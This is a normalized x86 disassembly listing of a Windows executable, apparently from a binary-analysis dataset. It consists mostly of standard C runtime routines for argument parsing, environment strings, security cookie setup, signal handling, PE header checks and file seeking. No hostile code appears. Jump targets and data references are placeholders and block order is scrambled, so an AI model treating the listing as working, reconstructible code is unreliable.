mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_40baf2
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_4078b6
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_40ef37
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_40bb51
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_4078b6
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_40c0ac
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_408210
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_408210
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_404538
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_40c0ac
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_404538
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40c008
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40718e
int3
add edi 0x4
sub_40bc2d
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_40ef37
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_40ef37
pop ecx
test eax eax
je r-xdata
call sub_40ef37
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_40bdc7
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_4078b6
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_40bc2d
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_40c067
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_40bc2d
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40be82
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_40c067
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_404538
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_40bf19
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40bf3f
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40bf65
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_40c008
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_405d3f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_4071e0
mov eax esi
jmp r-xdata
sub_40c067
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_404572
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_40c0ac
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ef4f
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40c0f8
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40efd1
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_40c146
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f07e
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_40c198
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
pop ebp
retn
sub_40c27e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_40c2c2
push 0x20
push r--data
call sub_409f90
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_407d44
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_409fd5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40c27e
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40603f
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_409da0
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_407c0d
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c429
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40c483
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40c4b0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40c4f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c540
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_409ff0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40c4b0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40c4f0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c5fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_407c0d
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4042ed
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_40c768
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405d3f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_4071e0
mov eax esi
sub_40c7dd
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_405d3f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_4071e0
mov eax esi
jmp r-xdata
sub_40c8aa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_40c8c5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405d3f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_4071e0
mov eax esi
sub_40c928
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_40c967
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_40dcd2
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_405d3f
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_405d65
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_40c9ec
push 0x14
push r--data
call sub_409f90
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_409fd5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_40dd3b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c967
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40cacc
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_40cad6
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_40c067
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_40cb1f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405d3f
mov [ eax ] 0x9
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
xor eax eax
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop ebp
retn
sub_40cb8b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
